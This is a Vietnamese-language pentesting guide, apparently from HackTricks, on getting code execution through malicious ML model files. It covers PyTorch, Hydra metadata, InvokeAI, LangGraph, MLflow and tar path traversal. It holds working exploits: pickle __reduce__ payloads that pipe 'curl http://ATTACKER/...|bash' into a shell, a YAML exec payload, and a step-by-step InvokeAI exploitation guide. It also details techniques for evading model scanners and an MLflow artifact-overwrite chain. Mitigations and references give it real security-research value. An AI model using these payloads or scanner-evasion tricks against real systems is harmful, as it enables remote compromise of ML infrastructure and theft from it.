# RCE mô hình

{{#include ../banners/hacktricks-training.md}}

## Nạp mô hình để RCE

Các mô hình Machine Learning thường được chia sẻ ở nhiều định dạng khác nhau, chẳng hạn như ONNX, TensorFlow, PyTorch, v.v. Các mô hình này có thể được nạp vào máy của nhà phát triển hoặc hệ thống production để sử dụng. Thông thường, mô hình không nên chứa mã độc, nhưng trong một số trường hợp, mô hình có thể được dùng để thực thi mã tùy ý trên hệ thống như một tính năng được thiết kế sẵn hoặc do lỗ hổng trong thư viện nạp mô hình.

Bảng sau liệt kê các lỗ hổng tiêu biểu thuộc nhóm này:

| **Framework / Công cụ**        | **Lỗ hổng (nếu có CVE)**                                                    | **Vector RCE**                                                                                                                           | **Tham khảo**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Deserialization không an toàn trong* `torch.load` **(CVE-2025-32434)**                                                              | Pickle độc hại trong checkpoint của mô hình dẫn đến thực thi mã (vượt qua biện pháp bảo vệ `weights_only`)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + tải xuống mô hình độc hại gây thực thi mã; RCE do Java deserialization trong management API                                        | |
| **NVIDIA Merlin Transformers4Rec** | Deserialization checkpoint không an toàn qua `torch.load` **(CVE-2025-23298)**                                           | Checkpoint không đáng tin cậy kích hoạt pickle reducer trong `load_model_trainer_states_from_checkpoint` → thực thi mã trong ML worker            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)<sup>[[6]](#references)</sup> |
| **LangGraph** (SQLite/Redis checkpointers) | SQLi + hook extension MessagePack không an toàn **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | Khóa `filter` do người dùng kiểm soát chèn cú pháp SQL/JSON-path, `UNION SELECT` tạo một hàng checkpoint giả, sau đó deserialization `msgpack` import và gọi mã Python do kẻ tấn công chọn | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (YAML không an toàn) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Nạp mô hình từ YAML sử dụng `yaml.unsafe_load` (thực thi mã) <br> Nạp mô hình có layer **Lambda** sẽ chạy mã Python tùy ý          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (phân tích TFLite)                                                                                          | Mô hình `.tflite` được tạo thủ công kích hoạt integer overflow → hỏng heap (có khả năng dẫn đến RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Nạp mô hình qua `joblib.load` thực thi pickle chứa payload `__reduce__` của kẻ tấn công                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (`np.load` không an toàn) *bị tranh cãi*                                                                              | Mặc định, `numpy.load` cho phép các mảng object được pickle – tệp `.npy/.npz` độc hại kích hoạt thực thi mã                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (directory traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | Đường dẫn external-weights của mô hình ONNX có thể thoát khỏi thư mục (đọc tệp tùy ý) <br> Tệp tar của mô hình ONNX độc hại có thể ghi đè tệp tùy ý (dẫn đến RCE) | |
| ONNX Runtime (rủi ro thiết kế)  | *(Không có CVE)* ONNX custom ops / control flow                                                                                    | Mô hình có custom operator yêu cầu nạp mã native của kẻ tấn công; đồ thị mô hình phức tạp lợi dụng logic để thực thi các phép tính ngoài ý muốn   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | Sử dụng model-load API khi bật `--model-control` cho phép path traversal tương đối để ghi tệp (ví dụ: ghi đè `.bashrc` để gây RCE)    | |
| **GGML (định dạng GGUF)**      | **CVE-2024-25664 … 25668** (nhiều lỗi heap overflow)                                                                         | Tệp mô hình GGUF lỗi định dạng gây heap buffer overflow trong parser, cho phép thực thi mã tùy ý trên hệ thống nạn nhân                     | |
| **Keras (định dạng cũ)**   | *(Không có CVE mới)* Mô hình Keras H5 legacy                                                                                         | Mô hình HDF5 (`.h5`) độc hại có mã trong layer Lambda vẫn thực thi khi nạp (Keras safe_mode không bao phủ định dạng cũ – “downgrade attack”) | |
| **Khác** (nói chung)        | *Lỗi thiết kế* – serialization bằng Pickle                                                                                         | Nhiều công cụ ML (ví dụ: định dạng mô hình dựa trên pickle, Python `pickle.load`) sẽ thực thi mã tùy ý được nhúng trong tệp mô hình trừ khi có biện pháp giảm thiểu | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Metadata không đáng tin cậy được truyền vào `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Metadata/cấu hình mô hình do kẻ tấn công kiểm soát đặt `_target_` thành callable tùy ý (ví dụ: `builtins.exec`) → được thực thi trong quá trình nạp, ngay cả với các định dạng “an toàn” (`.safetensors`, `.nemo`, `config.json` của repo) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Ngoài ra, có một số mô hình dựa trên Python pickle, chẳng hạn như các mô hình được [PyTorch](https://github.com/pytorch/pytorch/security) sử dụng, có thể được dùng để thực thi mã tùy ý trên hệ thống nếu chúng không được nạp với `weights_only=True`. Vì vậy, mọi mô hình dựa trên pickle đều có thể đặc biệt dễ bị loại tấn công này, ngay cả khi không được liệt kê trong bảng trên.

### Né tránh kiểm tra tĩnh trên checkpoint dựa trên pickle

Đường dẫn nạp mô hình gọi `pickle.load()`, `joblib.load()` hoặc `torch.load(..., weights_only=False)` không hạn chế là một điểm thực thi, chứ không chỉ đơn thuần là parser.<sup>[[22]](#references)</sup> Trong PyTorch 2.6, `torch.load()` mặc định dùng `weights_only=True` khi không cung cấp pickle module tùy chỉnh; các ví dụ bên dưới yêu cầu loader không hạn chế hoặc ứng dụng vô hiệu hóa biện pháp bảo vệ này để nạp một object không được hỗ trợ.<sup>[[4]](#references)</sup> Kết quả quét tĩnh sạch không làm thay đổi ranh giới đó.<sup>[[21]](#references)</sup>

Xem [Python pickle deserialization](../pentesting-web/deserialization/#pickle) để tìm hiểu primitive `__reduce__` cơ bản và [Fickling's ML import allowlist](keras-model-deserialization-rce-and-gadget-hunting.md#ml-pickle-import-allowlisting-for-aiml-models-fickling) để tìm hiểu các bước kiểm tra import lúc chạy.

#### Đăng ký một callable, sau đó phân giải bằng `EXT2`

Một pickle có thể gọi `copyreg.add_extension` thông qua `REDUCE`, đăng ký một cặp module/name với mã extension dạng số do kẻ tấn công chọn. Sau đó, `EXT2` phân giải mã đó thành callable, rồi một `REDUCE` khác có thể gọi callable này. Vì vậy, callable quan trọng không phải là toán hạng của opcode `GLOBAL` hoặc `STACK_GLOBAL`. Binarly đã chứng minh kỹ thuật này với `multiprocessing.util.spawnv_passfds`; bốn trong số năm scanner được đánh giá đã bỏ sót, trong khi SaferPickle phát hiện được. Việc thay đổi registry và phân giải `EXT2` diễn ra trong cùng một thao tác unpickling.<sup>[[21]](#references)[[22]](#references)</sup>

```text
GLOBAL       'copyreg add_extension'
BINUNICODE   'multiprocessing.util'
BINUNICODE   'spawnv_passfds'
BININT2      31337
TUPLE3
REDUCE       # register the extension
POP
EXT2         31337  # resolve the callable
# Push its arguments, then REDUCE to call it
```

Đây là bản phác thảo opcode, không phải checkpoint hoàn chỉnh: outer loader phải chấp nhận pickle stream bao quanh. Scanner chỉ tìm các callable nguy hiểm trong toán hạng `GLOBAL` sẽ bỏ sót lần tra cứu sau đó; scanner không hỗ trợ `EXT2` có thể thất bại trước khi đưa ra kết luận. Một allowlist nghiêm ngặt vẫn có thể từ chối chính `copyreg.add_extension`.<sup>[[21]](#references)</sup>

#### Che giấu các kiểu code object được tạo dựng bên trong các hàm thông thường

Một pickle chain khác có thể lấy `FunctionType` từ `type(copy.copy)` và `CodeType` từ `type(copy.copy.__code__)`, sau đó tạo code object từ bytecode được cung cấp, bọc nó thành function và gọi function đó. Biến thể được công bố lấy `__code__` thông qua `operator.methodcaller('__getattribute__', '__code__')`, vì vậy pickle không cần import tên của một trong hai constructor. Bố cục trường `CodeType(...)` và bytecode của nó phụ thuộc vào phiên bản CPython; payload được tạo cho interpreter khác có thể thất bại trước khi thực thi. SaferPickle vẫn gắn cờ mẫu minh họa, nhưng hạ mức đánh giá xuống `suspicious`; bốn scanner còn lại được đánh giá đều bỏ sót nó.<sup>[[21]](#references)[[22]](#references)</sup>

```python
from copy import copy
from operator import methodcaller
function_type = type(copy)
code_type = type(methodcaller('__getattribute__', '__code__')(copy))
# REDUCE can construct code_type(...) and function_type(code, {})
```

#### Kích hoạt tải model thứ hai từ một đối số pickle

Một pickle bên ngoài có thể gọi `torch.storage._load_from_bytes` với một model đã serialize do kẻ tấn công cung cấp làm đối số. Hàm đó gọi `torch.load(io.BytesIO(b), weights_only=False)`, vì vậy model lồng bên trong được deserialize mà không có giới hạn weights-only, dù với trình quét opcode cấp cao nhất, nó chỉ giống như các byte được truyền cho một callable. Lệnh load bên ngoài vẫn phải cho phép callable đó; `weights_only=True` không tự động khiến pickle bên ngoài chấp nhận nó. Các scanner không đệ quy vào những byte lồng bên trong có thể bỏ sót chuỗi `GLOBAL`/`REDUCE` bên trong.<sup>[[21]](#references)[[23]](#references)</sup>

#### Phân giải tên module pickle cũ tại thời điểm load

Với các protocol pickle thấp hơn 3, `fix_imports=True` mặc định của Python ánh xạ tham chiếu `GLOBAL` đến `commands.run` thành `subprocess.run` thông qua `_compat_pickle.IMPORT_MAPPING`. Vì vậy, scanner so sánh chuỗi module nguyên bản với denylist `subprocess` có thể bỏ sót callable tại thời điểm chạy. Cách này cần một loader giữ lại ánh xạ tương thích và chấp nhận các đối số gọi được tạo ra.<sup>[[21]](#references)[[24]](#references)[[25]](#references)</sup>

#### Đưa checkpoint không phải ZIP qua scanner chỉ hỗ trợ ZIP

Việc chọn định dạng có thể thất bại độc lập với quá trình kiểm tra opcode: Binarly phát hiện ModelScan 0.8.8 chuyển các file `.bin`, `.pt`, `.pth` và `.ckpt` sang scanner PyTorch chỉ hỗ trợ ZIP, rồi bỏ qua luồng pickle không phải ZIP thay vì chuyển sang scanner pickle thuần. Họ cũng ghi nhận một bố cục model TAR cũ được `torch.load()` chấp nhận nhưng ModelScan và JFrog không kiểm tra. Đây là các lỗ hổng phụ thuộc vào phiên bản scanner, không phải đặc tính của mọi scanner model.<sup>[[21]](#references)</sup>

#### Thực thi trước khi parser tĩnh xử lý đến phần đuôi bị lỗi

Một scanner duyệt toàn bộ pickle bằng `pickletools.genops()` có thể phát sinh lỗi với opcode bị cắt cụt sau một `REDUCE` hợp lệ. Unpickler không giới hạn đã gọi callable trước khi gặp phần đuôi đó, ngay cả khi toàn bộ lệnh load sau cùng phát sinh ngoại lệ. Mẫu được báo cáo đặt một `BINUNICODE` bị cắt cụt ngay sau `REDUCE` thực thi, khiến `pickletools.genops()` thất bại trong khi tác dụng phụ ghi file trước đó đã xảy ra. Cách này chỉ qua mặt scanner nếu scanner coi lỗi phân tích cú pháp là an toàn hoặc bỏ qua file. Cách này chỉ hữu ích khi tác dụng phụ có ý nghĩa mà không cần model được trả về thành công; mục tiêu yêu cầu load hoàn tất có thể từ chối artifact.<sup>[[21]](#references)</sup>

### Hydra metadata → RCE (hoạt động cả với safetensors)

`hydra.utils.instantiate()` import và gọi bất kỳ `_target_` dạng dotted nào trong đối tượng cấu hình/metadata. Khi các thư viện như Hugging Face Transformers đưa **metadata model không đáng tin cậy** vào `instantiate()`, kẻ tấn công có thể cung cấp một callable cùng các đối số để chạy ngay trong lúc load model (không cần pickle).<sup>[[11]](#references)</sup><sup>[[12]](#references)</sup><sup>[[13]](#references)</sup>

Ví dụ payload (hoạt động trong `model_config.yaml` của `.nemo`, `config.json` của repo hoặc `__metadata__` bên trong `.safetensors`):

```yaml
_target_: builtins.exec
_args_:
  - "import os; os.system('curl http://ATTACKER/x|bash')"
```

Key points:
- Được kích hoạt trước khi khởi tạo model trong NeMo `restore_from/from_pretrained`, các coder HuggingFace của uni2TS và các loader của FlexTok.
- Có thể bypass string block-list của Hydra bằng các đường dẫn import thay thế (ví dụ: `enum.bltns.eval`) hoặc tên được ứng dụng phân giải (ví dụ: `nemo.core.classes.common.os.system` → `posix`).<sup>[[14]](#references)</sup>
- FlexTok cũng phân tích metadata được biểu diễn dưới dạng chuỗi bằng `ast.literal_eval`, cho phép gây DoS (làm CPU/bộ nhớ tăng đột biến) trước khi gọi Hydra.

### 🆕  RCE trong InvokeAI qua `torch.load` (CVE-2024-12029)

`InvokeAI` là một giao diện web mã nguồn mở phổ biến dành cho Stable-Diffusion. Các phiên bản **5.3.1 – 5.4.2** để lộ REST endpoint `/api/v2/models/install`, cho phép người dùng tải xuống và load model từ các URL tùy ý.<sup>[[1]](#references)</sup>

Bên trong, endpoint này cuối cùng gọi:

```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```

Khi tệp được cung cấp là **checkpoint PyTorch (`*.ckpt`)**, `torch.load` thực hiện **giải tuần tự hóa pickle**. Vì nội dung được lấy trực tiếp từ URL do người dùng kiểm soát, kẻ tấn công có thể nhúng một đối tượng độc hại có phương thức `__reduce__` tùy chỉnh bên trong checkpoint; phương thức này được thực thi **trong quá trình giải tuần tự hóa**, dẫn đến **thực thi mã từ xa (RCE)** trên máy chủ InvokeAI.

Lỗ hổng được gán mã **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Hướng dẫn khai thác

1. Tạo một checkpoint độc hại:

```python
# payload_gen.py
import pickle, torch, os

class Payload:
    def __reduce__(self):
        return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
    pickle.dump(Payload(), f)
```

2. Host `payload.ckpt` trên HTTP server do bạn kiểm soát (ví dụ: `http://ATTACKER/payload.ckpt`).
3. Kích hoạt endpoint dễ bị tấn công (không cần xác thực):

```python
import requests

requests.post(
    "http://TARGET:9090/api/v2/models/install",
    params={
        "source": "http://ATTACKER/payload.ckpt",  # remote model URL
        "inplace": "true",                         # write inside models dir
        # the dangerous default is scan=false → no AV scan
    },
    json={},                                         # body can be empty
    timeout=5,
)
```

4. Khi InvokeAI tải tệp xuống, nó gọi `torch.load()` → gadget `os.system` chạy và kẻ tấn công chiếm được quyền thực thi mã trong ngữ cảnh của tiến trình InvokeAI.

Exploit có sẵn: module **Metasploit** `exploit/linux/http/invokeai_rce_cve_2024_12029` tự động hóa toàn bộ quy trình.<sup>[[3]](#references)</sup>

#### Điều kiện

•  InvokeAI 5.3.1-5.4.2 (cờ scan mặc định là **false**)
•  `/api/v2/models/install` có thể được kẻ tấn công truy cập
•  Tiến trình có quyền thực thi lệnh shell

#### Biện pháp giảm thiểu

* Nâng cấp lên **InvokeAI ≥ 5.4.3** – bản vá đặt `scan=True` làm mặc định và quét malware trước khi giải tuần tự hóa.<sup>[[2]](#references)</sup>
* Khi tải checkpoint bằng chương trình, hãy dùng `torch.load(file, weights_only=True)` hoặc helper [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) mới.
* Áp dụng allow-list / chữ ký cho các nguồn model và chạy dịch vụ với quyền tối thiểu.

> ⚠️ Hãy nhớ rằng **mọi** định dạng dựa trên Python pickle (bao gồm nhiều tệp `.pt`, `.pkl`, `.ckpt`, `.pth`) đều vốn không an toàn khi giải tuần tự hóa từ các nguồn không đáng tin cậy.

---

Ví dụ về biện pháp giảm thiểu tạm thời nếu bạn buộc phải tiếp tục chạy các phiên bản InvokeAI cũ phía sau reverse proxy:

```nginx
location /api/v2/models/install {
    deny all;                       # block direct Internet access
    allow 10.0.0.0/8;               # only internal CI network can call it
}
```

### 🆕 NVIDIA Merlin Transformers4Rec RCE qua `torch.load` không an toàn (CVE-2025-23298)

Transformers4Rec của NVIDIA (thuộc Merlin) để lộ một trình tải checkpoint không an toàn, gọi trực tiếp `torch.load()` trên các đường dẫn do người dùng cung cấp. Vì `torch.load` dựa vào Python `pickle`, checkpoint do kẻ tấn công kiểm soát có thể thực thi mã tùy ý thông qua một reducer trong quá trình giải tuần tự hóa.<sup>[[5]](#references)</sup>

Đường dẫn dễ bị tấn công (trước khi sửa): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Vì sao điều này dẫn đến RCE: Trong Python pickle, một object có thể định nghĩa reducer (`__reduce__`/`__setstate__`) trả về một callable cùng các đối số. Callable này sẽ được thực thi trong quá trình unpickling. Nếu checkpoint chứa object như vậy, mã sẽ chạy trước khi sử dụng bất kỳ trọng số nào.

Ví dụ checkpoint độc hại tối giản:

```python
import torch

class Evil:
    def __reduce__(self):
        import os
        return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
    "model_state_dict": Evil(),
    "trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```

Các vector phát tán và phạm vi ảnh hưởng:
- Checkpoint/model bị cài mã độc, được chia sẻ qua repo, bucket hoặc registry tạo tác
- Pipeline tự động tiếp tục huấn luyện/triển khai, tự động tải checkpoint
- Việc thực thi diễn ra bên trong các worker huấn luyện/suy luận, thường có quyền nâng cao (ví dụ: root trong container)

Khắc phục: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) thay `torch.load()` trực tiếp bằng một deserializer bị giới hạn, chỉ cho phép các thành phần trong danh sách cho phép, được triển khai trong `transformers4rec/utils/serialization.py`. Loader mới xác thực kiểu/dữ liệu trường và ngăn các callable tùy ý được gọi trong quá trình tải.<sup>[[7]](#references)</sup>

Hướng dẫn phòng thủ dành riêng cho checkpoint PyTorch:
- Không unpickle dữ liệu không đáng tin cậy. Ưu tiên các định dạng không thể thực thi như [Safetensors](https://huggingface.co/docs/safetensors/index) hoặc ONNX khi có thể.
- Nếu bắt buộc phải dùng serialization của PyTorch, hãy đảm bảo `weights_only=True` (được hỗ trợ trong các phiên bản PyTorch mới hơn) hoặc dùng unpickler tùy chỉnh chỉ cho phép các thành phần trong danh sách cho phép, tương tự bản vá Transformers4Rec.<sup>[[4]](#references)</sup>
- Xác minh nguồn gốc/chữ ký của model và sandbox quá trình deserialization (seccomp/AppArmor; người dùng không phải root; giới hạn FS và chặn kết nối mạng đi ra).
- Theo dõi các tiến trình con bất thường do dịch vụ ML tạo ra khi tải checkpoint; rà soát việc sử dụng `torch.load()`/`pickle`.

POC và tham chiếu về lỗ hổng/bản vá:<sup>[[8]](#references)</sup><sup>[[9]](#references)</sup><sup>[[10]](#references)</sup>
- Loader dễ bị tấn công trước bản vá: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js<sup>[[8]](#references)</sup>
- POC checkpoint độc hại: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js<sup>[[9]](#references)</sup>
- Loader sau bản vá: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js<sup>[[10]](#references)</sup>

## Ví dụ – tạo model PyTorch độc hại

- Tạo model:

```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
    def __reduce__(self):
        # This code will be executed when unpickled (e.g., on model.load_state_dict)
        return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```

- Nạp model:

```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
    def __init__(self):
        super().__init__()
        self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```

### Giải tuần tự hóa Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

FaceDetection-DSFD của Tencent cung cấp endpoint `resnet` giải tuần tự hóa dữ liệu do người dùng kiểm soát. ZDI xác nhận rằng kẻ tấn công từ xa có thể dụ nạn nhân tải một trang/tệp độc hại, khiến trang/tệp đó gửi một blob đã tuần tự hóa được tạo thủ công đến endpoint này và kích hoạt quá trình giải tuần tự hóa với quyền `root`, dẫn đến hệ thống bị xâm nhập hoàn toàn.

Luồng khai thác tương tự như kiểu lạm dụng pickle thường gặp:

```python
import pickle, os, requests

class Payload:
    def __reduce__(self):
        return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
              headers={"Content-Type": "application/octet-stream"})
```

Bất kỳ gadget nào có thể được gọi trong quá trình deserialization (constructor, `__setstate__`, callback của framework, v.v.) đều có thể bị weaponize theo cách tương tự, bất kể dữ liệu được truyền qua HTTP, WebSocket hay một file được thả vào thư mục đang được theo dõi.

### LangGraph checkpointer SQLi → MessagePack RCE

Chuỗi tấn công này đáng chú ý vì attacker **không cần tải lên một file model độc hại**. Thay vào đó, ứng dụng cung cấp một **API persistence cho AI agent** (`get_state_history(..., filter=...)`), và đầu vào của người dùng được đưa vào query builder của checkpointer.

#### 1. SQLi cấu trúc trong bộ lọc metadata

Một mẫu SQLite dễ bị tấn công trông như sau:

```python
for query_key, query_value in filter.items():
    operator, param_value = _where_value(query_value)
    predicates.append(
        f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
    )
```

Giá trị được bind sau đó, nhưng `query_key` được nối vào **chuỗi JSON path**, vì vậy một dấu `'` bên trong khóa từ điển sẽ thoát khỏi `'$.{query_key}'` và chèn SQL. Bài học tương tự cũng áp dụng cho **JSON path, identifier, operator, `LIMIT` và trường TTL**: placeholder chỉ bảo vệ các giá trị, không bảo vệ cú pháp cấu trúc của truy vấn.

#### 2. `UNION SELECT` có thể nhắm tới các sink ở bước xử lý sau, không chỉ đánh cắp dữ liệu

Truy vấn trả về `type` và các byte `checkpoint` đã được serialize, những dữ liệu này sau đó được xử lý như sau:

```python
self.serde.loads_typed((type, checkpoint))
```

Điều đó có nghĩa là SQLi trong mệnh đề `WHERE` có thể chèn một **hàng kết quả giả**:

```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```

Nếu code phía sau phân tích cú pháp, deserialize, ghi hoặc thực thi bất kỳ cột nào được chọn, hãy ánh xạ những cột đó tới các sink của chúng. Trong trường hợp này, hàng giả biến SQLi thành **deserialization do attacker kiểm soát**.

#### 3. Unsafe MessagePack extension hooks tương đương với code gadget

Đường xử lý `msgpack` của LangGraph sử dụng một extension hook tùy chỉnh để unpack một tuple lồng nhau và thực thi:

```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```

Vì vậy, một đối tượng extension MessagePack mã hóa nội dung tương đương với `("os", "system", "id > /tmp/pwned")` sẽ import `os`, phân giải `system` và chạy lệnh. Khi rà soát các framework AI, hãy kiểm tra **custom MessagePack/JSON/pickle revivers** để tìm dynamic imports, reflection hoặc arbitrary callable dispatch.

#### 4. Mẫu audit thực tế cho agent framework

Rà soát mọi input do người dùng kiểm soát có thể đi tới:
- API liệt kê state history / memory / replay / checkpoint
- Các bộ dựng structured filter tạo ra SQL hoặc Redis query fragment
- Custom deserializer (`pickle`, `msgpack`, `json` object hook, YAML constructor)
- Các luồng khôi phục tin cậy vào những hàng dữ liệu trả về từ persistence layer

Chuỗi khai thác cụ thể này ảnh hưởng đến các bản triển khai LangGraph tự host dùng SQLite hoặc Redis checkpointer khi người dùng không đáng tin cậy có thể kiểm soát `filter`. Các phiên bản đã vá được nêu trong thông báo là `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+` và `langgraph-checkpoint 4.0.1+`.<sup>[[15]](#references)</sup>

### Ghi đè artifact MLflow PyFunc dẫn đến pickle RCE

Một MLflow PyFunc được tạo từ `PythonModel` có thể lưu đối tượng đã tuần tự hóa dưới dạng `python_model.pkl`. Metadata của model chỉ định `mlflow.pyfunc.model` làm loader, và phần triển khai của MLflow sử dụng tên tệp này cho Python model đã lưu. Do đó, quyền ghi vào artifact store có thể dẫn đến thực thi mã trong một ứng dụng khác tải model đó sau này.<sup>[[17]](#references)[[18]](#references)</sup>

Chuỗi khai thác hữu ích là **quyền ghi artifact → thay thế pickle → khiến một inference consumer tải lại nó**. Với một experiment sử dụng root `mlflow-artifacts:/...` được proxy, hãy liệt kê experiment, run và đường dẫn artifact của model. Tracking server cung cấp `GET` và `PUT` trên `/api/2.0/mlflow-artifacts/artifacts/<artifact-path>`.<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Preserve a copy and confirm the exact object first
curl -u USER:PASS \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  -o original.pkl

# Upload the pickle without curl transforming its bytes
curl -u USER:PASS -X PUT \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  --data-binary @payload.pkl
```

Một reducer tối giản có thể thực thi lệnh ngay khi consumer unpickle artifact. Tạo payload bằng phiên bản Python được khai báo trong `MLmodel` giúp tránh các vấn đề tương thích.<sup>[[17]](#references)[[20]](#references)</sup>

```python
import os
import pickle

class Payload:
    def __reduce__(self):
        return os.system, ("ping -c 1 ATTACKER",)

with open("payload.pkl", "wb") as f:
    pickle.dump(Payload(), f)
```

Kích hoạt thao tác **tải model hiện có**, chẳng hạn như prediction, scoring hoặc deployment. Đừng huấn luyện lại trước vì việc huấn luyện có thể thay artifact độc hại bằng một model mới. Lỗi ứng dụng không chứng minh rằng khai thác thất bại: reducer trả về mã thoát dạng số nguyên của lệnh thay vì một model có thể sử dụng. Hãy bắt đầu bằng một tác động phụ có thể quan sát được, chẳng hạn như ICMP hoặc HTTP callback, rồi thay bằng payload cuối cùng.<sup>[[20]](#references)</sup>

Trong quá trình đánh giá, hãy phân biệt quyền tạo một run với quyền ghi đè artifact thuộc về run khác. Xem xét xác thực và quyền cập nhật theo từng run, kiểm tra các thay đổi bất thường đối với `python_model.pkl`, và xem nguồn gốc cũng như tính toàn vẹn của model là một phần của ranh giới thực thi. Code MLflow hiện tại cũng hỗ trợ đặt `MLFLOW_ALLOW_PICKLE_DESERIALIZATION=false` và khuyến nghị dùng artifact models-from-code thay vì tải dữ liệu cloudpickle.<sup>[[18]](#references)[[19]](#references)[[20]](#references)</sup>

### Model server và hạ tầng ML bị lộ

Tải một model độc hại không phải là cách duy nhất để thực thi code trên hạ tầng ML. Các API gửi job, endpoint xác thực code và thao tác kéo model registry của những dịch vụ AI tự host có thể dẫn đến thực thi code mà không cần bất kỳ file model nào. Xem [Các dịch vụ AI tự host bị lộ](AI-Exposed-Self-Hosted-AI-Services.md).

## Model dẫn đến Path Traversal

Như đã đề cập trong [**bài blog này**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), hầu hết định dạng model được các framework AI khác nhau sử dụng đều dựa trên archive, thường là `.zip`. Do đó, có thể lợi dụng các định dạng này để thực hiện tấn công path traversal, cho phép đọc các file tùy ý từ hệ thống nơi model được tải.<sup>[[16]](#references)</sup>

Ví dụ, với đoạn code sau, bạn có thể tạo một model sẽ tạo file trong thư mục `/tmp` khi được tải:

```python
import tarfile

def escape(member):
    member.name = "../../tmp/hacked"     # break out of the extract dir
    return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
    tf.add("harmless.txt", filter=escape)
```

Hoặc, với đoạn code sau, bạn có thể tạo một model sẽ tạo symlink đến thư mục `/tmp` khi được tải:

```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
    member.type, member.linkname = tarfile.SYMTYPE, TARGET
    return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
    tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
    tf.add(PAYLOAD)                      # rides the symlink
```

### Tìm hiểu chuyên sâu: Giải tuần tự hóa Keras .keras và săn tìm gadget

Để xem hướng dẫn chuyên sâu về các thành phần bên trong .keras, RCE qua Lambda-layer, vấn đề import tùy ý trong phiên bản ≤ 3.8 và cách phát hiện gadget bên trong allowlist sau khi bản vá được áp dụng, hãy xem:


{{#ref}}
keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## References

- [1] [Blog OffSec – "CVE-2024-12029 – InvokeAI giải tuần tự hóa dữ liệu không đáng tin cậy"](https://www.offsec.com/blog/cve-2024-12029/)
- [2] [Commit bản vá InvokeAI 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [3] [Tài liệu module Metasploit của Rapid7](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [4] [PyTorch – các cân nhắc về bảo mật cho torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [5] [Blog ZDI – CVE-2025-23298: Đạt được thực thi mã từ xa trong NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [6] [Thông báo bảo mật ZDI: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [7] [Commit bản vá Transformers4Rec b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [8] [Trình nạp dễ bị tổn thương trước bản vá (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
